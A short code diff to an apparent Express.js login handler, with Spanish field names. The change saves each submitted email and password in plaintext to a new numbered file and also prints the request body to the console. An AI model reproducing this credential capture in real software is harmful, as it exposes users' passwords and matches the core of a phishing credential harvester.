@@ -6,6 +6,7 @@ var app = express();
 app.use(express.static('public'));
 
 var fs = require ('fs');
+var cont = 0;
 
 
 app.use(express.urlencoded({extended: true}));
@@ -27,8 +28,9 @@ app.get('/', function(request, response){
 
 app.post('/login', function(request,response){
     console.log(request.body);
-    fs.writeFile('info.txt','Datos: '+ 'correo: '+ request.body.correo+ ' ' + 'contrasena: '+request.body.contrasena , 'utf8',function(){
+    fs.writeFile('datos/info'+cont+'.txt','Datos: '+ 'correo: '+ request.body.correo+ ' ' + 'contrasena: '+request.body.contrasena , 'utf8',function(){
         console.log('archivo escrito');
+        cont ++;
         });
 
     response.redirect('/bienvenida');
